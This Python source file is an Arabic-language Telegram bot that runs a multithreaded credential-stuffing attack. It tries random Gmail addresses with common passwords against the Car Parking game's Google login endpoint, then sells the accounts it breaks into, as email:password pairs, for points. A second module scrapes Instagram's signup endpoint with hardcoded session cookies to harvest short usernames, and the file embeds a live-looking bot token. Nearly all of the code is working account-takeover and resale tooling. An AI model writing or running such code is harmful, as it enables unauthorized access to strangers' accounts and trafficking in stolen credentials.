import urllib.request
import urllib.parse
import json
import random
import time
import sys
import os
import threading
import string
import logging
from datetime import datetime
from flask import Flask
import telebot
from telebot import types

# ================== الإعدادات العامة ==================
BOT_TOKEN = "8730263970:AAHTcWNLwUOCBnXWsPbG_vho68cGEoFZy4M"
ADMIN_ID = "7075895496"
ADMIN_USERNAME = "@XOREYT"
THREADS = 150
BOT_LINK = "https://t.me/Xoregrops_bot"
MAX_WAIT_TIME = 3600 
FIRE_EFFECT = 5104841245755180586 

DB_FILE = "database.json"

logging.basicConfig(filename="logs.txt", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def log_action(action, user_id, details=""):
    logging.info(f"ACTION: {action} | USER: {user_id} | DETAILS: {details}")

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
        except: pass
    return {"users": {}, "channels": {}, "banned": [], "codes": {}, "settings": {"daily_gift": 1, "ref_points": 5, "min_cars": 30}}

def save_db():
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(db, f, ensure_ascii=False, indent=4)
    except: pass

db = load_db()
users = db.get("users", {})
channels = db.get("channels", {})
banned_users = db.get("banned", [])
codes = db.get("codes", {})
settings = db.get("settings", {"daily_gift": 1, "ref_points": 5, "min_cars": 30})

good = 0
bad = 0
running = False
ig_running = False
STOP_FLAG = threading.Event()
IG_STOP_FLAG = threading.Event()
lock = threading.Lock()
admin_states = {} 

app = Flask(__name__)

@app.route("/")
def index(): return "Mehdi's Bot - System Online"

bot = telebot.TeleBot(BOT_TOKEN)

# ================== دالة إرسال التأثير ==================
def send_with_fire(chat_id, text, markup=None, parse_mode="HTML"):
    try:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode=parse_mode, message_effect_id=FIRE_EFFECT)
    except Exception:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode=parse_mode)

# ================== دوال مساعدة ==================
def is_banned(user_id): return str(user_id) in banned_users
def is_admin(user_id): return str(user_id) == ADMIN_ID

def get_user(user_id):
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"points": 0, "refs": 0, "referred_by": None, "joined": time.time(), "last_daily": 0, "hits_bought": 0, "ig_bought": 0, "total_earned": 0, "level": 1}
        save_db()
    return users[uid]

def add_points(user_id, amount, reason="unknown"):
    uid = str(user_id)
    user = get_user(uid)
    user["points"] += amount
    user["total_earned"] += amount if amount > 0 else 0
    new_level = 1 + (user["total_earned"] // 10)
    if new_level > user["level"]:
        user["level"] = new_level
        try: send_with_fire(uid, f"🎉 مبروك! لقد وصلت للمستوى {new_level}!")
        except: pass
    save_db()

def check_forced_sub(message):
    if is_admin(message.from_user.id): return True
    if not channels: return True
    not_joined = []
    for ch_id, ch_name in channels.items():
        try:
            member = bot.get_chat_member(ch_id, message.from_user.id)
            if member.status in ['left', 'kicked']: not_joined.append(ch_name)
        except: not_joined.append(ch_name)
    if not_joined:
        markup = types.InlineKeyboardMarkup(row_width=1)
        for ch_id, ch_name in channels.items():
            try:
                chat_info = bot.get_chat(ch_id)
                link = chat_info.invite_link or f"https://t.me/{chat_info.username}"
                markup.add(types.InlineKeyboardButton(text=f"📢 {ch_name}", url=link))
            except: pass
        markup.add(types.InlineKeyboardButton(text="✅ تحقق", callback_data="check_sub"))
        send_with_fire(message.chat.id, "⚠️ <b>يجب الاشتراك أولاً:</b>", markup)
        return False
    return True

def get_user_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🏪 المتجر", "📸 صيد إنستقرام")
    markup.add("💎 نقاطي", "🎁 هدية")
    markup.add("🔗 إحالة", "🏆 المتصدرين")
    markup.add("💳 استلام كود", "ℹ️ معلومات")
    if is_admin(user_id): markup.add("👑 لوحة الأدمن")
    return markup

def get_admin_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("▶️ بدء الصيد", "🛑 إيقاف الصيد")
    markup.add("💳 إنشاء كود", "💰 إضافة نقاط")
    markup.add("📢 إذاعة", "⚙️ القنوات")
    markup.add("📊 الإحصائيات", "🚫 الحظر")
    markup.add("📜 السجل", "📤 التصدير")
    markup.add("👤 وضع المستخدم")
    return markup

# ================== دوال صيد Car Parking ==================
def http_post(url, json_data=None, headers=None, timeout=10):
    try:
        data = json.dumps(json_data).encode('utf-8') if json_data else None
        req = urllib.request.Request(url, data=data, method='POST')
        if headers:
            for k, v in headers.items(): req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8', errors='ignore')
    except: return 0, ''

def get_car_count(id_token):
    try:
        url = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2"
        headers = {"authorization": f"Bearer {id_token}", "content-type": "application/json", "user-agent": "CarParking/265"}
        status, body = http_post(url, {"data": None}, headers, timeout=10)
        if status == 200:
            data = json.loads(body)
            if 'result' in data:
                cars = json.loads(data['result'])
                return len(cars) if isinstance(cars, list) else len(cars.get('cars', []))
    except: pass
    return 0

def check_account(email, password):
    global good, bad
    try:
        url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_IOS"}
        headers = {"User-Agent": "CarParking/265", "Content-Type": "application/octet-stream"}
        
        status, body = http_post(url, payload, headers, timeout=10)
        if status == 200:
            res_json = json.loads(body)
            id_token = res_json.get('idToken')
            if id_token:
                cars = get_car_count(id_token)
                if cars >= settings.get("min_cars", 30):
                    with lock: good += 1
                    with open("stock.txt", 'a', encoding='utf-8') as f: f.write(f'{email}:{password}:{cars}\n')
                else:
                    with lock: bad += 1
        else:
            with lock: bad += 1
    except: pass

def generate_credentials():
    pattern = random.randint(0, 3)
    if pattern == 0: name = random.choice(['john', 'mike', 'sara']) + ''.join(random.choices(string.digits, k=random.randint(1, 3)))
    elif pattern == 1: name = random.choice(['ahmed', 'ali', 'omar']) + random.choice(['_', '.']) + random.choice(['king', 'pro'])
    elif pattern == 2: name = random.choice(['cool', 'fast', 'dark']) + random.choice(['', '123', '2023'])
    else: name = 'user' + str(random.randint(1000, 9999))
    return name.lower() + '@gmail.com', random.choice(['12345678', 'password', '123456789'])

def worker():
    while not STOP_FLAG.is_set():
        email, password = generate_credentials()
        check_account(email, password)
        time.sleep(0.01)

def run_checker():
    global running, good, bad
    with lock: good = 0; bad = 0
    running = True; STOP_FLAG.clear()
    for _ in range(THREADS): threading.Thread(target=worker, daemon=True).start()
    while running and not STOP_FLAG.is_set(): time.sleep(10)

# ================== دوال صيد يوزرات إنستقرام (SANITITO TOOL) ==================
def check_ig_username():
    global good, bad
    try:
        # نفس منطق أداة SANITITO
        uus = '_6w9u.fzqa_jcv.pnx_'
        ks = str(''.join(random.choice(uus) for i in range(5)))
        
        url = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
        headers_kai = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
            'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
            'x-instagram-ajax': '72bda6b1d047',
            'x-requested-with': 'XMLHttpRequest'
        } 
        
        datas_kai = {
            'email' : 'a@gmail.com',
            'username': f'{ks}',
            'first_name': 'AA',
            'opt_into_one_tap': 'false'
        }
        
        response = requests.post(url, headers=headers_kai, data=datas_kai, timeout=10)
        
        # التحقق من رد إنستقرام (إذا رجع رسالة الخطأ المعروفة، يعني اليوزر متاح)
        ku = ('{"account_created": false, "errors": {"email": [{"message": "Too many accounts are using a@gmail.com.", "code": "email_sharing_limit"}], "__all__": [{"message": "Create a password at least 6 characters long.", "code": "too_short_password"}]}, "dryrun_passed": false, "username_suggestions": [], "status": "ok", "error_type": "form_validation_error"}')
        
        if ku in response.text:
            with lock: good += 1
            with open("ig_stock.txt", 'a', encoding='utf-8') as f: f.write(f'{ks}\n')
            log_action("IG_HIT", "SYSTEM", f"Found username: {ks}")
        else:
            with lock: bad += 1
    except Exception as e:
        with lock: bad += 1

def ig_worker():
    while not IG_STOP_FLAG.is_set():
        check_ig_username()
        time.sleep(random.uniform(0.1, 0.3))

def run_ig_checker():
    global ig_running, good, bad
    with lock: good = 0; bad = 0
    ig_running = True; IG_STOP_FLAG.clear()
    for _ in range(30): threading.Thread(target=ig_worker, daemon=True).start()
    while ig_running and not IG_STOP_FLAG.is_set(): time.sleep(10)

# ================== دالة شريط التحميل والاسترجاع ==================
def wait_and_refund(chat_id, msg_id, user_id, cost, file_type, mode_text):
    start_time = time.time()
    
    while time.time() - start_time < MAX_WAIT_TIME:
        time.sleep(10)
        elapsed = time.time() - start_time
        progress = int((elapsed / MAX_WAIT_TIME) * 100)
        
        filled = "▓" * (progress // 10) + "░" * (10 - (progress // 10))
        minutes = int((MAX_WAIT_TIME - elapsed) // 60)
        
        try:
            bot.edit_message_text(
                f"⏳ <b>{mode_text}</b>\n\n[{filled}] {progress}%\n\n⏱️ الوقت المتبقي: {minutes} دقيقة\n<i>(سيتم استرجاع نقاطك تلقائياً عند الانتهاء).</i>",
                chat_id, msg_id, parse_mode="HTML"
            )
        except: pass

        target_file = "stock.txt" if file_type == "car" else "ig_stock.txt"
        if os.path.exists(target_file):
            with open(target_file, 'r', encoding='utf-8') as f:
                if len(f.readlines()) > 0:
                    bot.edit_message_text(f"✅ <b>تم الصيد بنجاح!</b>\nادخل على المتجر عشان تستلم.", chat_id, msg_id, parse_mode="HTML")
                    return

    add_points(user_id, cost, "refund_timeout")
    bot.edit_message_text(
        f"❌ <b>عذراً، لم نجد أي طلب خلال {MAX_WAIT_TIME//60} دقيقة.</b>\n\n💰 تم استرجاع <b>{cost} نقطة</b> لحسابك تلقائياً.",
        chat_id, msg_id, parse_mode="HTML"
    )

# ================== أوامر البوت العامة ==================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_banned(message.from_user.id): return bot.reply_to(message, "🚫 محظور.")
    if not check_forced_sub(message): return
    
    user = get_user(message.from_user.id)
    ref_id = message.text.split()[1] if len(message.text.split()) > 1 else None
    if ref_id and ref_id != str(message.from_user.id) and user["referred_by"] is None:
        try:
            if ref_id in users:
                user["referred_by"] = ref_id
                user["refs"] += 1
                users[ref_id]["refs"] += 1
                add_points(ref_id, settings.get("ref_points", 5), "referral")
                save_db()
                bot.send_message(int(ref_id), f"🎉 شخص جديد دخل! +{settings.get('ref_points', 5)} نقاط.")
        except: pass

    text = f"👋 <b>أهلاً {message.from_user.first_name}!</b>\n\n💎 نقاطك: {user['points']}\n📈 مستواك: {user['level']}"
    send_with_fire(message.chat.id, text, get_user_keyboard(message.from_user.id))

@bot.message_handler(func=lambda message: message.text == "🏪 المتجر")
def shop(message):
    user = get_user(message.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚗 صيدة Car Parking (1 نقطة)", callback_data="buy_1"))
    markup.add(types.InlineKeyboardButton("📦 5 صيدات Car Parking (4 نقاط)", callback_data="buy_5"))
    send_with_fire(message.chat.id, f"🛒 متجر Car Parking\nرصيدك: {user['points']}", markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def buy_hit(call):
    amount = int(call.data.split("_")[1])
    cost = {1: 1, 5: 4}[amount]
    user = get_user(call.from_user.id)
    
    if user["points"] < cost: return bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
    
    try:
        with open("stock.txt", 'r', encoding='utf-8') as f: lines = f.readlines()
        
        if len(lines) < amount:
            user["points"] -= cost
            save_db()
            bot.answer_callback_query(call.id, "⏳ المخزن فاضي، جاري الصيد...", show_alert=False)
            msg = send_with_fire(call.from_user.id, "⏳ جاري تجهيز الصيد...")
            
            if not running:
                threading.Thread(target=run_checker, daemon=True).start()
                
            threading.Thread(target=wait_and_refund, args=(call.from_user.id, msg.message_id, call.from_user.id, cost, "car", "جاري صيد حساب Car Parking..."), daemon=True).start()
            return
        
        bought = lines[:amount]
        with open("stock.txt", 'w', encoding='utf-8') as f: f.writelines(lines[amount:])
        user["points"] -= cost
        user["hits_bought"] += amount
        save_db()
        send_with_fire(call.from_user.id, f"✅ <b>تم الشراء:</b>\n<code>{''.join(bought)}</code>")
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ خطأ.", show_alert=True)

@bot.message_handler(func=lambda message: message.text == "📸 صيد إنستقرام")
def shop_ig(message):
    user = get_user(message.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📱 ثلاثي (3 حروف) - 5 نقاط", callback_data="ig_3"))
    markup.add(types.InlineKeyboardButton("📱 رباعي (4 حروف) - 10 نقاط", callback_data="ig_4"))
    markup.add(types.InlineKeyboardButton("📱 شبه ثلاثي - 3 نقاط", callback_data="ig_semi3"))
    markup.add(types.InlineKeyboardButton("📱 شبه رباعي - 7 نقاط", callback_data="ig_semi4"))
    send_with_fire(message.chat.id, f"📸 متجر إنستقرام\nرصيدك: {user['points']} نقطة\n\nاختر نوع الحساب:", markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("ig_"))
def buy_ig(call):
    cost = {"ig_3": 5, "ig_4": 10, "ig_semi3": 3, "ig_semi4": 7}.get(call.data, 5)
    user = get_user(call.from_user.id)
    if user["points"] < cost: return bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
    
    try:
        with open("ig_stock.txt", 'r', encoding='utf-8') as f: lines = f.readlines()
        
        if not lines:
            user["points"] -= cost
            save_db()
            bot.answer_callback_query(call.id, "⏳ المخزن فاضي، جاري الصيد...", show_alert=False)
            msg = send_with_fire(call.from_user.id, "⏳ جاري تجهيز الصيد...")
            
            if not ig_running:
                threading.Thread(target=run_ig_checker, daemon=True).start()
                
            threading.Thread(target=wait_and_refund, args=(call.from_user.id, msg.message_id, call.from_user.id, cost, "ig", "جاري صيد يوزر إنستقرام..."), daemon=True).start()
            return

        bought = lines[0].strip()
        with open("ig_stock.txt", 'w', encoding='utf-8') as f: f.writelines(lines[1:])
        user["points"] -= cost
        save_db()
        send_with_fire(call.from_user.id, f"✅ <b>تم الشراء:</b> <code>@{bought}</code>")
    except: bot.answer_callback_query(call.id, "⚠️ خطأ.", show_alert=True)

@bot.message_handler(func=lambda message: message.text == "💎 نقاطي")
def my_points(message):
    user = get_user(message.from_user.id)
    send_with_fire(message.chat.id, f"💎 نقاطك: <b>{user['points']}</b>\n📈 مستواك: <b>{user['level']}</b>\n👥 إحالاتك: <b>{user['refs']}</b>")

@bot.message_handler(func=lambda message: message.text == "🎁 هدية")
def daily_gift(message):
    user = get_user(message.from_user.id)
    now = time.time()
    if now - user["last_daily"] < 86400:
        return send_with_fire(message.chat.id, f"⚠️ متبقي: {int(86400 - (now - user['last_daily']))//3600} ساعة.")
    user["last_daily"] = now
    add_points(message.from_user.id, settings.get("daily_gift", 1), "daily")
    send_with_fire(message.chat.id, "🎁 حصلت على نقطة!")

@bot.message_handler(func=lambda message: message.text == "🔗 إحالة")
def ref_link(message):
    link = f"{BOT_LINK}?start={message.from_user.id}"
    send_with_fire(message.chat.id, f"🔗 رابطك:\n<code>{link}</code>")

@bot.message_handler(func=lambda message: message.text == "🏆 المتصدرين")
def top_users(message):
    sorted_users = sorted(users.items(), key=lambda x: x[1].get("total_earned", 0), reverse=True)[:5]
    text = "🏆 <b>أفضل 5:</b>\n"
    for i, (uid, data) in enumerate(sorted_users, 1):
        text += f"{i}. ID: <code>{uid}</code> - ⭐ {data.get('points', 0)}\n"
    send_with_fire(message.chat.id, text)

@bot.message_handler(func=lambda message: message.text == "ℹ️ معلومات")
def bot_info(message):
    send_with_fire(message.chat.id, f"🤖 بوت Car Parking\n👨‍💻 المطور: {ADMIN_USERNAME}\n⚡ السرعة: {THREADS}")

@bot.message_handler(func=lambda message: message.text == "💳 استلام كود")
def redeem_code_start(message):
    msg = send_with_fire(message.chat.id, "💳 أرسل كود الشحن الآن:")
    bot.register_next_step_handler(msg, redeem_code_process)

def redeem_code_process(message):
    code = message.text.strip().upper()
    if code in codes:
        c = codes[code]
        if c["used_count"] >= c["max_uses"] and c["max_uses"] != 0:
            return send_with_fire(message.chat.id, "❌ هذا الكود استنفذ عدد استخداماته.")
        if str(message.from_user.id) in c["used_by"]:
            return send_with_fire(message.chat.id, "❌ لقد استخدمت هذا الكود مسبقاً.")
            
        add_points(message.from_user.id, c["amount"], "redeem_code")
        c["used_count"] += 1
        c["used_by"].append(str(message.from_user.id))
        save_db()
        send_with_fire(message.chat.id, f"✅ <b>مبروك!</b> تم شحن <b>{c['amount']} نقطة</b> لحسابك.")
    else:
        send_with_fire(message.chat.id, "❌ الكود غير صحيح.")

# ================== أوامر الأدمن ==================
@bot.message_handler(func=lambda message: message.text == "👑 لوحة الأدمن")
def admin_panel(message):
    if not is_admin(message.from_user.id): return
    send_with_fire(message.chat.id, "👑 <b>لوحة تحكم الأدمن</b>", get_admin_keyboard())

@bot.message_handler(func=lambda message: message.text == "👤 وضع المستخدم")
def user_mode(message):
    if not is_admin(message.from_user.id): return
    send_with_fire(message.chat.id, "👤 <b>أنت الآن في وضع المستخدم.</b>", get_user_keyboard(message.from_user.id))

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "▶️ بدء الصيد")
def admin_start(message):
    global running
    if running: return send_with_fire(message.chat.id, "⚠️ شغال.")
    msg = send_with_fire(message.chat.id, "⏳ جاري التجهيز...")
    def update_progress():
        for i in range(1, 101):
            if STOP_FLAG.is_set(): break
            try:
                filled = "█" * (i // 10) + "░" * (10 - i // 10)
                bot.edit_message_text(f"⏳ <b>جاري الصيد...</b>\n[{filled}] {i}%", msg.chat.id, msg.message_id, parse_mode="HTML")
            except: pass
            time.sleep(1.5)
    threading.Thread(target=run_checker, daemon=True).start()
    threading.Thread(target=update_progress, daemon=True).start()

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🛑 إيقاف الصيد")
def admin_stop(message):
    global running, ig_running
    STOP_FLAG.set(); running = False
    IG_STOP_FLAG.set(); ig_running = False
    send_with_fire(message.chat.id, "🛑 تم الإيقاف.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "💳 إنشاء كود")
def create_code_start(message):
    msg = send_with_fire(message.chat.id, "💳 أرسل عدد النقاط للكود (مثال: 10):")
    bot.register_next_step_handler(msg, create_code_amount)

def create_code_amount(message):
    try:
        amount = int(message.text.strip())
        if amount <= 0: raise ValueError
        admin_states[message.from_user.id] = {"amount": amount}
        msg = send_with_fire(message.chat.id, "👥 كم شخص يقدر يستخدم الكود؟ (مثال: 1 لشخص واحد، 0 لعدد لا نهائي):")
        bot.register_next_step_handler(msg, create_code_uses)
    except:
        send_with_fire(message.chat.id, "❌ رقم غير صحيح.")

def create_code_uses(message):
    try:
        uses = int(message.text.strip())
        if uses < 0: raise ValueError
        admin_states[message.from_user.id]["uses"] = uses
        code = f"MEHDI-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        
        codes[code] = {"amount": admin_states[message.from_user.id]["amount"], "max_uses": uses, "used_count": 0, "used_by": []}
        save_db()
        
        text = f"✅ <b>تم إنشاء الكود!</b>\n\n💳 الكود: <code>{code}</code>\n💰 النقاط: {admin_states[message.from_user.id]['amount']}\n👥 الاستخدامات: {uses if uses > 0 else 'لا نهائي'}"
        send_with_fire(message.chat.id, text)
        del admin_states[message.from_user.id]
    except:
        send_with_fire(message.chat.id, "❌ رقم غير صحيح.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "💰 إضافة نقاط")
def admin_add_points(message):
    msg = send_with_fire(message.chat.id, "💰 أرسل (الآيدي) و (عدد النقاط) مفصولين بمسافة.\nمثال: `7075895496 50`")
    bot.register_next_step_handler(msg, admin_add_points_process)

def admin_add_points_process(message):
    try:
        parts = message.text.split()
        uid, amount = parts[0], int(parts[1])
        add_points(uid, amount, "admin_add")
        send_with_fire(message.chat.id, f"✅ تم إضافة {amount} نقطة للآيدي {uid}.")
        try: send_with_fire(uid, f"🎁 تم إضافة {amount} نقطة لحسابك من قبل الإدارة.")
        except: pass
    except:
        send_with_fire(message.chat.id, "❌ الصيغة غير صحيحة.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📢 إذاعة")
def admin_broadcast_start(message):
    msg = send_with_fire(message.chat.id, "📢 أرسل الرسالة الآن (نص، صورة، ملف..):")
    bot.register_next_step_handler(msg, admin_broadcast_send)

def admin_broadcast_send(message):
    send_with_fire(message.chat.id, "⏳ جاري الإرسال للجميع...")
    count = 0
    failed = 0
    for uid in list(users.keys()):
        try:
            bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
            count += 1
            time.sleep(0.05)
        except: failed += 1
    send_with_fire(message.chat.id, f"✅ تم الإرسال إلى {count} شخص.\n❌ فشل: {failed}")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📊 الإحصائيات")
def admin_stats(message):
    total_hits = sum(1 for _ in open("stock.txt")) if os.path.exists("stock.txt") else 0
    ig_hits = sum(1 for _ in open("ig_stock.txt")) if os.path.exists("ig_stock.txt") else 0
    send_with_fire(message.chat.id, f"📊 <b>إحصائيات البوت:</b>\n\n👥 المستخدمين: {len(users)}\n🚗 مخزن Car: {total_hits}\n📸 مخزن IG: {ig_hits}\n🎟️ الأكواد: {len(codes)}\n🏃 الحالة: {'شغال 🟢' if running else 'متوقف 🔴'}")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "⚙️ القنوات")
def admin_channels(message):
    text = "⚙️ <b>القنوات:</b>\n"
    for c_id, c_n in channels.items(): text += f"- {c_n} (<code>{c_id}</code>)\n"
    text += "\nإضافة: <code>/addchannel @username</code>\nحذف: <code>/delchannel ID</code>"
    send_with_fire(message.chat.id, text)

@bot.message_handler(commands=['addchannel'])
def add_channel(message):
    if not is_admin(message.from_user.id): return
    try:
        ch = message.text.split(maxsplit=1)[1]
        if ch.startswith('@'):
            info = bot.get_chat(ch)
            channels[str(info.id)] = info.title
        else: channels[str(ch)] = "قناة " + str(ch)
        save_db()
        send_with_fire(message.chat.id, "✅ تم إضافة القناة.")
    except Exception as e: send_with_fire(message.chat.id, f"❌ تأكد أن البوت أدمن في القناة.\n{e}")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📤 التصدير")
def admin_export(message):
    try:
        if os.path.exists("stock.txt"): bot.send_document(message.chat.id, open("stock.txt", 'rb'), caption="📦 مخزن Car")
        if os.path.exists("ig_stock.txt"): bot.send_document(message.chat.id, open("ig_stock.txt", 'rb'), caption="📦 مخزن IG")
        bot.send_document(message.chat.id, open(DB_FILE, 'rb'), caption="📁 قاعدة البيانات")
    except: send_with_fire(message.chat.id, "❌ خطأ في التصدير.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📜 السجل")
def admin_logs(message):
    try:
        with open("logs.txt", 'r', encoding='utf-8') as f: lines = f.readlines()[-20:]
        send_with_fire(message.chat.id, "📜 <b>السجل:</b>\n<code>" + "".join(lines) + "</code>")
    except: send_with_fire(message.chat.id, "❌ لا يوجد سجل.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🚫 الحظر")
def admin_ban_menu(message):
    send_with_fire(message.chat.id, f"🚫 <b>إدارة الحظر</b>\n\nالأوامر:\n<code>/ban USER_ID</code>\n<code>/unban USER_ID</code>\n\nالمحظورين: {len(banned_users)}")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id): return
    try:
        uid = message.text.split()[1]
        if uid not in banned_users:
            banned_users.append(uid)
            save_db()
            send_with_fire(message.chat.id, f"✅ تم حظر {uid}.")
    except: send_with_fire(message.chat.id, "❌ خطأ.")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id): return
    try:
        uid = message.text.split()[1]
        if uid in banned_users:
            banned_users.remove(uid)
            save_db()
            send_with_fire(message.chat.id, f"✅ تم إلغاء حظر {uid}.")
    except: send_with_fire(message.chat.id, "❌ خطأ.")

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_sub_cb(call):
    if check_forced_sub(call.message): send_with_fire(call.from_user.id, "✅ تم التحقق! أرسل /start.")
    else: bot.answer_callback_query(call.id, "❌ لم تشترك بعد.", show_alert=True)

# ================== تشغيل ==================
def start_bot_polling():
    while True:
        try: bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logging.error(f"Polling crashed: {e}")
            time.sleep(5)

if __name__ == "__main__":
    for f in ["stock.txt", "ig_stock.txt"]:
        if not os.path.exists(f): open(f, 'w').close()
            
    threading.Thread(target=start_bot_polling, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
